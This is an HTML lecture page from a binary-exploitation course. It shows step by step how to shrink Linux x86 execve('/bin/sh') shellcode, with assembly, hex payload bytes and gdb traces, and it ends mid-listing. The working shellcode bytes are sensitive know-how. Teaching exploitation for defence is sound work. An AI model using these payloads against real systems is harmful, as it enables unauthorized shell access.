@@ -1,0 +1,746 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Lec. 12: Short Shell Code</title>
+<!-- 2015-10-07 Wed 08:28 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { color: green; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  td, th { vertical-align:top;  }
+  th.right  { text-align: center;  }
+  th.left   { text-align: center;   }
+  th.center { text-align: center; }
+  td.right  { text-align: right;  }
+  td.left   { text-align: left;   }
+  td.center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara:nth-child(2) { display: inline; }
+  .footpara { display: block; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012  Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 12: Short Shell Code</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#sec-1">1. Reducing the Size of Shell Code</a>
+<ul>
+<li><a href="#sec-1-1">1.1. Using the Stack More Effectively</a>
+<ul>
+<li><a href="#sec-1-1-1">1.1.1. Attempt 1</a></li>
+<li><a href="#sec-1-1-2">1.1.2. Attempt 2</a></li>
+</ul>
+</li>
+<li><a href="#sec-1-2">1.2. Removing Crud from the Shell Code</a></li>
+<li><a href="#sec-1-3">1.3. Zeroing Out Better</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1"><span class="section-number-2">1</span> Reducing the Size of Shell Code</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+Shell code has three main properties: (1) it executes a system call to
+open a shell or do some other action; (2) it does not contain null
+bytes; and (3), it is small. So far, the shell code we've developed is
+37 bytes. Let's review that piece of shell code now:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm" id="long_shell.asm"><span style="color: #87cefa;">SECTION</span> .text                   <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Code section</span>
+                <span style="color: #00ffff;">global</span> _start   <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Make label available to linker</span>
+
+<span style="color: #87cefa;">_start</span>:                         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Standard ld entry point</span>
+
+         <span style="color: #00ffff;">jmp</span> callback           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Jump to the end to get our current address</span>
+
+<span style="color: #87cefa;">dowork</span>:
+         <span style="color: #00ffff;">pop</span> esi                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">esi now holds the address of "/bin/sh"</span>
+
+         <span style="color: #00ffff;">xor</span> edx,edx            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">edx = 0 (it's also param #3 - NULL)</span>
+         <span style="color: #00ffff;">push</span> edx               <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[1] - NULL</span>
+         <span style="color: #00ffff;">push</span> esi               <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[0] - "/bin/sh"</span>
+
+         <span style="color: #00ffff;">mov</span> ecx,esp            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #2 - address of args array</span>
+         <span style="color: #00ffff;">mov</span> ebx,esi            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #1 - "/bin/sh"</span>
+         <span style="color: #00ffff;">xor</span> eax,eax            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">eax = 0</span>
+         <span style="color: #00ffff;">mov</span> al,0xb             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for execve</span>
+         <span style="color: #00ffff;">int</span> 0x80               <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+
+         <span style="color: #00ffff;">xor</span> ebx,ebx            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Exit code, 0 = normal</span>
+         <span style="color: #00ffff;">xor</span> eax,eax            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">eax = 0</span>
+         <span style="color: #00ffff;">inc</span> eax                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for exit (1)</span>
+         <span style="color: #00ffff;">int</span> 0x80               <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+
+<span style="color: #87cefa;">callback</span>:
+         <span style="color: #00ffff;">call</span> dowork            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Pushes the address of "/bin/sh" onto the stack</span>
+         <span style="color: #00ffff;">db</span> <span style="color: #ffa07a;">"/bin/sh"</span>,0         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">The program we want to run - "/bin/sh"</span>
+</pre>
+</div>
+
+<p>
+To see it's current size, let's compile and use the hexify program to
+count the number of bytes:
+</p>
+<pre class="example">
+user@si485H-base:demo$ nasm -g -f elf -o long_shell.o long_shell.asm
+user@si485H-base:demo$ ld  -o long_shell long_shell.o
+user@si485H-base:demo$ ./hexify.sh long_shell
+\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00
+user@si485H-base:demo$ printf `./hexify.sh long_shell` | wc -c
+37
+</pre>
+
+<p>
+That may seem ok: 37 bytes is pretty short. We can do better, though,
+because the shorter the shell code the more easily we can drop it as a
+payload.
+</p>
+</div>
+
+<div id="outline-container-sec-1-1" class="outline-3">
+<h3 id="sec-1-1"><span class="section-number-3">1.1</span> Using the Stack More Effectively</h3>
+<div class="outline-text-3" id="text-1-1">
+<p>
+Our first target for reducing the size the shell code is to remove the
+jmp-call back procedures. Let's look at the objdump of the code to see
+how many bytes are used:
+</p>
+
+<pre class="example">
+08048060 &lt;_start&gt;:
+ 8048060: eb 16                 jmp    8048078 &lt;callback&gt;
+
+08048062 &lt;dowork&gt;:
+ 8048062: 5e                    pop    esi
+ 8048063: 31 d2                 xor    edx,edx
+ 8048065: 52                    push   edx
+ 8048066: 56                    push   esi
+ 8048067: 89 e1                 mov    ecx,esp
+ 8048069: 89 f3                 mov    ebx,esi
+ 804806b: 31 c0                 xor    eax,eax
+ 804806d: b0 0b                 mov    al,0xb
+ 804806f: cd 80                 int    0x80
+ 8048071: 31 db                 xor    ebx,ebx
+ 8048073: 31 c0                 xor    eax,eax
+ 8048075: 40                    inc    eax
+ 8048076: cd 80                 int    0x80
+
+08048078 &lt;callback&gt;:
+ 8048078: e8 e5 ff ff ff        call   8048062 &lt;dowork&gt;
+ 804807d: 2f                    das    
+ 804807e: 62 69 6e              bound  ebp,QWORD PTR [ecx+0x6e]
+ 8048081: 2f                    das    
+ 8048082: 73 68                 jae    80480ec &lt;callback+0x74&gt;
+</pre>
+
+<p>
+If you look closely at the <code>call</code> instruction, you see that this takes
+5 whole bytes! That's simply too many. Let's look for a way to reduce
+this.
+</p>
+</div>
+
+<div id="outline-container-sec-1-1-1" class="outline-4">
+<h4 id="sec-1-1-1"><span class="section-number-4">1.1.1</span> Attempt 1</h4>
+<div class="outline-text-4" id="text-1-1-1">
+<p>
+Let's try the strategy where we push all the bytes of the "/bin/sh"
+onto the stack, one-by-one, and then the stack pointer will be the
+address of the start of the string. Something like this:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm" id="push_shell_1.asm"><span style="color: #87cefa;">SECTION</span> .text                   <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Code section</span>
+                 <span style="color: #00ffff;">global</span> _start  <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Make label available to linker</span>
+<span style="color: #87cefa;">_start</span>:
+         <span style="color: #00ffff;">xor</span> eax,eax
+
+         <span style="color: #00ffff;">push</span> eax               <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">\0</span>
+         <span style="color: #00ffff;">push</span> 0x68              <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">h</span>
+         <span style="color: #00ffff;">push</span> 0x73              <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">s</span>
+         <span style="color: #00ffff;">push</span> 0x2f              <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">/</span>
+         <span style="color: #00ffff;">push</span> 0x6e              <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">n</span>
+         <span style="color: #00ffff;">push</span> 0x69              <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">i</span>
+         <span style="color: #00ffff;">push</span> 0x62              <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">b</span>
+         <span style="color: #00ffff;">push</span> 0x2f              <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">/</span>
+
+         <span style="color: #00ffff;">mov</span> esi,esp            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">esp is address of "/bin/sh"</span>
+
+         <span style="color: #00ffff;">xor</span> edx,edx            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">edx = 0 (it's also param #3 - NULL)</span>
+         <span style="color: #00ffff;">push</span> edx               <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[1] - NULL</span>
+         <span style="color: #00ffff;">push</span> esi               <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[0] - "/bin/sh"</span>
+
+
+         <span style="color: #00ffff;">mov</span> ecx,esp            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #2 - address of args array</span>
+         <span style="color: #00ffff;">mov</span> ebx,esi            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #1 - "/bin/sh" is *esp</span>
+         <span style="color: #00ffff;">mov</span> al,0xb             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for execve</span>
+         <span style="color: #00ffff;">int</span> 0x80               <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+
+         <span style="color: #00ffff;">xor</span> ebx,ebx            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Exit code, 0 = normal</span>
+         <span style="color: #00ffff;">xor</span> eax,eax            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">eax = 0</span>
+         <span style="color: #00ffff;">inc</span> eax                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for exit (1)</span>
+         <span style="color: #00ffff;">int</span> 0x80               <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+</pre>
+</div>
+
+<p>
+Looking at this, we get the same effect of the jmp-call back to get a
+position free reference to the string "/bin/sh". Let;s take a look at
+the objdump to see how this changed things:
+</p>
+
+<pre class="example">
+Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060:	31 c0                	xor    eax,eax
+ 8048062:	50                   	push   eax
+ 8048063:	6a 68                	push   0x68
+ 8048065:	6a 73                	push   0x73
+ 8048067:	6a 2f                	push   0x2f
+ 8048069:	6a 6e                	push   0x6e
+ 804806b:	6a 69                	push   0x69
+ 804806d:	6a 62                	push   0x62
+ 804806f:	6a 2f                	push   0x2f
+ 8048071:	89 e6                	mov    esi,esp
+ 8048073:	31 d2                	xor    edx,edx
+ 8048075:	52                   	push   edx
+ 8048076:	56                   	push   esi
+ 8048077:	89 e1                	mov    ecx,esp
+ 8048079:	89 f3                	mov    ebx,esi
+ 804807b:	b0 0b                	mov    al,0xb
+ 804807d:	cd 80                	int    0x80
+ 804807f:	31 db                	xor    ebx,ebx
+ 8048081:	31 c0                	xor    eax,eax
+ 8048083:	40                   	inc    eax
+ 8048084:	cd 80                	int    0x80
+</pre>
+
+<p>
+Looking closely, there are two bytes for every push, and we push 7
+items, for 14 bytes. Referring back to the jmp-callback version of the
+code. There were 12 bytes for the call back and 2 bytes for the jmp,
+that's 14 byts. We gained nothing!
+</p>
+
+<p>
+Worse, let's see if this shell code actually works:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./push_shell_1 
+user@si485H-base:demo$
+</pre>
+<p>
+Fail. 
+</p>
+
+<p>
+To figure out why this shell code doesn't work, we'll have to trace
+its execution in gdb. 
+</p>
+<pre class="example">
+user@si485H-base:demo$ gdb -q push_shell_1 
+Reading symbols from push_shell_1...done.
+(gdb) b _start
+Breakpoint 1 at 0x8048060
+(gdb) r
+Starting program: /home/user/git/si485-binary-exploits/lec/12/demo/push_shell_1 
+
+Breakpoint 1, 0x08048060 in _start ()
+(gdb) ds
+Dump of assembler code for function _start:
+=&gt; 0x08048060 &lt;+0&gt;:	xor    eax,eax
+   0x08048062 &lt;+2&gt;:	push   eax
+   0x08048063 &lt;+3&gt;:	push   0x68
+   0x08048065 &lt;+5&gt;:	push   0x73
+   0x08048067 &lt;+7&gt;:	push   0x2f
+   0x08048069 &lt;+9&gt;:	push   0x6e
+   0x0804806b &lt;+11&gt;:	push   0x69
+   0x0804806d &lt;+13&gt;:	push   0x62
+   0x0804806f &lt;+15&gt;:	push   0x2f
+   0x08048071 &lt;+17&gt;:	mov    esi,esp
+   0x08048073 &lt;+19&gt;:	xor    edx,edx
+   0x08048075 &lt;+21&gt;:	push   edx
+   0x08048076 &lt;+22&gt;:	push   esi
+   0x08048077 &lt;+23&gt;:	mov    ecx,esp
+   0x08048079 &lt;+25&gt;:	mov    ebx,esi
+   0x0804807b &lt;+27&gt;:	mov    al,0xb
+   0x0804807d &lt;+29&gt;:	int    0x80
+   0x0804807f &lt;+31&gt;:	xor    ebx,ebx
+   0x08048081 &lt;+33&gt;:	xor    eax,eax
+   0x08048083 &lt;+35&gt;:	inc    eax
+   0x08048084 &lt;+36&gt;:	int    0x80
+End of assembler dump.
+(gdb) x/3x $esp
+0xbffff720:	0x00000001	0xbffff847	0x00000000
+</pre>
+<p>
+Looking at the stack at this point, things seem to be going
+okay. Let's take three steps:
+</p>
+<pre class="example">
+(gdb) ni 3
+0x08048065 in _start ()
+(gdb) ds
+Dump of assembler code for function _start:
+   0x08048060 &lt;+0&gt;:	xor    eax,eax
+   0x08048062 &lt;+2&gt;:	push   eax
+   0x08048063 &lt;+3&gt;:	push   0x68
+=&gt; 0x08048065 &lt;+5&gt;:	push   0x73
+   0x08048067 &lt;+7&gt;:	push   0x2f
+   0x08048069 &lt;+9&gt;:	push   0x6e
+   0x0804806b &lt;+11&gt;:	push   0x69
+   0x0804806d &lt;+13&gt;:	push   0x62
+   0x0804806f &lt;+15&gt;:	push   0x2f
+   0x08048071 &lt;+17&gt;:	mov    esi,esp
+   0x08048073 &lt;+19&gt;:	xor    edx,edx
+   0x08048075 &lt;+21&gt;:	push   edx
+   0x08048076 &lt;+22&gt;:	push   esi
+   0x08048077 &lt;+23&gt;:	mov    ecx,esp
+   0x08048079 &lt;+25&gt;:	mov    ebx,esi
+   0x0804807b &lt;+27&gt;:	mov    al,0xb
+   0x0804807d &lt;+29&gt;:	int    0x80
+   0x0804807f &lt;+31&gt;:	xor    ebx,ebx
+   0x08048081 &lt;+33&gt;:	xor    eax,eax
+   0x08048083 &lt;+35&gt;:	inc    eax
+   0x08048084 &lt;+36&gt;:	int    0x80
+End of assembler dump.
+(gdb) x/3x $esp
+0xbffff718:	0x00000068	0x00000000	0x00000001
+</pre>
+<p>
+Ok. Now we have sense of what is going on. Looking closely, you can
+see that when we pushed 0x68, we didn't push just the byte of 0x68, we
+push the 4-byte value of 0x00000068. Why?
+</p>
+
+<p>
+The stack is always 4-byte aligned. This is to ensure that when you
+push and pop, you get consistent answers. The thing that you push onto
+the stack is always popped off the stack. There is no way to push
+single bytes. It doesn't allow you to get out of alignment, so you
+must ALWAYS push 4-byte values. But, we can work with that.
+</p>
+</div>
+</div>
+<div id="outline-container-sec-1-1-2" class="outline-4">
+<h4 id="sec-1-1-2"><span class="section-number-4">1.1.2</span> Attempt 2</h4>
+<div class="outline-text-4" id="text-1-1-2">
+<p>
+Now that we are a bit more familiar with the stack, we can change our
+shell code to push the entire byte sequence for "/bin/sh" in two
+steps. 
+</p>
+
+<p>
+Problem: "/bin/sh" is 7 bytes long, and we can only push 4 byte
+sequences! This can be solved with leveraging the file system path
+constructs. For example, "//bin/sh" is the same as "/bin//sh" which is
+the same as "/bin/sh". 
+</p>
+
+<p>
+With that, we have the following shell code:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">SECTION</span> .text                   <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Code section</span>
+                 <span style="color: #00ffff;">global</span> _start  <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Make label available to linker</span>
+<span style="color: #87cefa;">_start</span>:
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">push</span> eax                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">\0</span>
+        <span style="color: #00ffff;">push</span> 0x68732f6e         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">n/sh</span>
+        <span style="color: #00ffff;">push</span> 0x69622f2f         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">//bi </span>
+
+        <span style="color: #00ffff;">mov</span> esi,esp             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">esp is argv</span>
+
+        <span style="color: #00ffff;">xor</span> edx,edx             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">edx = 0 (it's also param #3 - NULL)</span>
+        <span style="color: #00ffff;">push</span> edx                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[1] - NULL</span>
+        <span style="color: #00ffff;">push</span> esi                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[0] - "/bin/sh"</span>
+
+
+        <span style="color: #00ffff;">mov</span> ecx,esp             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #2 - address of args array</span>
+        <span style="color: #00ffff;">mov</span> ebx,esi             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #1 - "/bin/sh" is *esp</span>
+        <span style="color: #00ffff;">mov</span> al,0xb              <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for execve</span>
+        <span style="color: #00ffff;">int</span> 0x80                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+
+        <span style="color: #00ffff;">xor</span> ebx,ebx             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Exit code, 0 = normal</span>
+        <span style="color: #00ffff;">xor</span> eax,eax             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">eax = 0</span>
+        <span style="color: #00ffff;">inc</span> eax                 <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for exit (1)</span>
+        <span style="color: #00ffff;">int</span> 0x80                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+</pre>
+</div>
+
+<p>
+Looking closely at the two push commands, we have to be mindful of the
+order and little-endian.
+</p>
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">push</span> <span style="color: #00ffff;">0x68732f6e</span>         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">n/sh</span>
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">0x69622f2f</span>         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">//bi</span>
+</pre>
+</div>
+<p>
+Note first that the last thing pushed on the stack would be the start
+of the string sequence. The byte 0x2f is '/', and looking closely at
+the bytes, you see that the number 0x69622f2f is "ib//" which when
+reversed in little endian storage, becomes "//bi."
+</p>
+
+<p>
+Finally, we still have to NULL terminate the string, so we push onto
+the stack first zero byte. When it is all said and done, we get the
+following:
+</p>
+<pre class="example">
+      | 0x0 0x0 0x0 0x0 | 0x00000000
+      | 'n' '/' 's' 's' | 0x68732f6e
+esp-&gt; | '/' '/' 'b' 'i' | 0x69622f2f
+      '-----------------'
+</pre>
+<p>
+And, we can now use the value of <code>esp</code> as the start of the "/bin/sh\0"
+string.
+</p>
+
+<p>
+Let's compile and see if this works:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ld  -o push_shell_2 push_shell_2.o
+user@si485H-base:demo$ ./push_shell_2 
+$ echo "It worked!"
+It worked!
+$
+</pre>
+
+<p>
+And, we can see how many bytes it is:
+</p>
+<pre class="example">
+user@si485H-base:demo$ printf `./hexify.sh push_shell_2` | wc -c
+34
+</pre>
+<p>
+Woohoo! We saved 3 bytes. 
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-sec-1-2" class="outline-3">
+<h3 id="sec-1-2"><span class="section-number-3">1.2</span> Removing Crud from the Shell Code</h3>
+<div class="outline-text-3" id="text-1-2">
+<p>
+The next place to turn our frugal eyes upon is the extra bit of crud
+in the shell code. In particular, let's start by removing the <code>exit</code>
+system call. Why do we need to exit cleanly from our shell code if we
+fail to execve? Who cares? We are trying to bring down the systems and
+a bit of segfaulting here and there is ok by me.
+</p>
+
+<p>
+The second item we want to focus on is the <code>execve()</code> call itself. It
+turns out that you don't need to do quite as much work for the shell
+to execute. Consider this small example program:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c" id="small_execve.c">user@si485H-base:demo$ cat small_execve.c 
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;unistd.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> main(){
+  execve(<span style="color: #ffa07a;">"/bin/sh"</span>,<span style="color: #7fffd4;">NULL</span>,<span style="color: #7fffd4;">NULL</span>);
+}
+</pre>
+</div>
+
+<p>
+Notice, in this is <code>execve</code> call there is no <code>argv</code> array. We just
+leave this NULL, which is not preferred but still works. Essentially,
+you are indicating that you do not want any arguments at all, but
+<code>execve</code> is smart enough to fix this for you later. In fact, running
+this program works fine:
+</p>
+<pre class="example">
+user@si485H-base:demo$ gcc small_execve.c   -o small_execve
+small_execve.c: In function ‘main’:
+small_execve.c:4:3: warning: null argument where non-null required (argument 2) [-Wnonnull]
+   execve("/bin/sh",NULL,NULL);
+   ^
+user@si485H-base:demo$ ./small_execve 
+$ echo "It Works!"           
+It Works!
+$
+</pre>
+<p>
+Yes, the compiler complains, but who cares if it works. 
+</p>
+
+<p>
+With these changes, we are left with the following shell code:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm" id="smaller_shell.asm"><span style="color: #87cefa;">SECTION</span> .text                   <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Code section</span>
+                 <span style="color: #00ffff;">global</span> _start  <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Make label available to linker</span>
+<span style="color: #87cefa;">_start</span>:
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">push</span> eax                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">\0</span>
+        <span style="color: #00ffff;">push</span> 0x68732f6e         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">n/sh</span>
+        <span style="color: #00ffff;">push</span> 0x69622f2f         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">//bi </span>
+
+        <span style="color: #00ffff;">xor</span> edx,edx            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Parm #3 - NULL</span>
+        <span style="color: #00ffff;">xor</span> ecx,ecx            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #2 - NULL</span>
+        <span style="color: #00ffff;">mov</span> ebx,esp             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #1 - "/bin/sh" is *esp</span>
+        <span style="color: #00ffff;">mov</span> al,0xb              <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for execve</span>
+        <span style="color: #00ffff;">int</span> 0x80                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+</pre>
+</div>
+<p>
+And we can compile and test:
+</p>
+<pre class="example">
+user@si485H-base:demo$ nasm -f elf smaller_shell.asm -o smaller_shell.o
+user@si485H-base:demo$ ld smaller_shell.o -o smaller_shell
+user@si485H-base:demo$ ./smaller_shell 
+$ echo "It Works!"    
+It Works!
+$ 
+user@si485H-base:demo$ printf `./hexify.sh smaller_shell` | wc -c
+23
+</pre>
+<p>
+Now we are at 23 bytes! Wow, but believe it or not, we can still do 2 bytes better.
+</p>
+</div>
+</div>
+<div id="outline-container-sec-1-3" class="outline-3">
+<h3 id="sec-1-3"><span class="section-number-3">1.3</span> Zeroing Out Better</h3>
+<div class="outline-text-3" id="text-1-3">
+<p>
+The last place to gain an advantage, and it is a small one is in the
+process of zeroing bytes. There are a number of instructions that are
+designed to deal with 8-byte arithmetic by using multiple registers
+to store the results of values that overflow 4-byte numbers. The
+instruction we will concern ourselves with is the <code>mul</code> instruction.
+</p>
+
+<p>
+The <code>mul</code> instruction has the following form:
+</p>
+<pre class="example">
+mul reg
+</pre>
+<p>
+It will:
+</p>
+<ul class="org-ul">
+<li>Multiple the value in <code>reg</code> with the value currently in <code>eax</code>
+</li>
+<li>The result will be stored with the lower 4-bytes in <code>eax</code> and the
+upper 4-bytes in <code>edx</code>
+</li>
+</ul>
+
+<p>
+What does this imply? Well, if we multiple where the value in the
+registers is zero, then <code>eax</code> will be zero AND <code>edx</code> will be zero. The
+<code>mul</code> instruction is just two bytes, and using that two bytes, we can
+do two zero'ing, saving us two bytes overall.
+</p>
+
+<p>
+Here's the resulting shell code:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm" id="smallest_shell.asm"><span style="color: #87cefa;">user</span>@si485H-base:demo$ cat smallest_shell.asm 
+<span style="color: #87cefa;">SECTION</span> .text                   <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Code section</span>
+                 <span style="color: #00ffff;">global</span> _start  <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Make label available to linker</span>
+<span style="color: #87cefa;">_start</span>:
+        <span style="color: #00ffff;">xor</span> ecx,ecx
+        <span style="color: #00ffff;">mul</span> ecx                 <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">0's edx and and eax</span>
